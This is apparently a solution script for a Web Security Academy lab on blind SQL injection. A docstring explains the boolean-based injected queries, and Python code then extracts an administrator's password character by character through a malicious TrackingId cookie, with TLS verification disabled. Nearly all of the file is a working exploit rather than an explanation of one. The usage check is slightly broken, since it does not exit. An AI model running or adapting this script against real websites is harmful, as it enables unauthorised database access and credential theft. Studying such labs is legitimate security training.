# Blind SQL injection with conditional responses
""" select tracking-id from tracking-table where trackingId= 'TlBaSrzfhyoEfnUn'
    if this trackingId exits -> query returns value -> welcome back message 

    select tracking-id from tracking-table where trackingId= 'TlBaSrzfhyoEfnUn' and 1 = 1 --' -> welcome back message 
    select tracking-id from tracking-table where trackingId= 'TlBaSrzfhyoEfnUn' and 1 = 0 --' -> NO welcome back message 

    Confirm that have a users table 
    select tracking-id from tracking-table where trackingId= 'TlBaSrzfhyoEfnUn' and (select 'x' from users LIMIT 1) = 'x' --' 
    
    Confirm that username administrator exits users table 
    select tracking-id from tracking-table where trackingId= 'TlBaSrzfhyoEfnUn' 
    and (select username from users where username = 'administrator') = 'administrator' --' 

    Enumerate the password of the administrator
    select tracking-id from tracking-table where trackingId= 'TlBaSrzfhyoEfnUn' 
    and (select username from users where username = 'administrator' and Length(password) = 20) = 'administrator' --' 
    -> password is exactly 20 characters

    select tracking-id from tracking-table where trackingId= 'TlBaSrzfhyoEfnUn' 
    and (select substring(password, 1, 1) from users where username = 'administrator') = '$a$' --' 

"""
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import urllib

proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080' }

# url = 'https://0af700a503bab58c99a2b73f005f008c.web-security-academy.net/'

def sqli_password(url):
    password_extracted = ""
    for i in range (1,21):
        for j in range (32,126):
            sqli_payload = "' and (select ascii (substring(password, %s, 1)) from users where username = 'administrator') = '%s' --" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId':'94hgPuo2a9GOtTSi' + sqli_payload_encoded,
                      'session': 'IzSQQXwXr0PLqYY5wArtKU38hQhOmsRg'
                      }
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r'+ password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r'+ password_extracted)
                sys.stdout.flush()
                break
def main(): 
    if len(sys.argv) != 2:
        print ("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
    url = sys.argv[1]
    print("[+] Retrieving administrator password...")
    sqli_password(url)
    
if __name__ == '__main__':
    main()
    


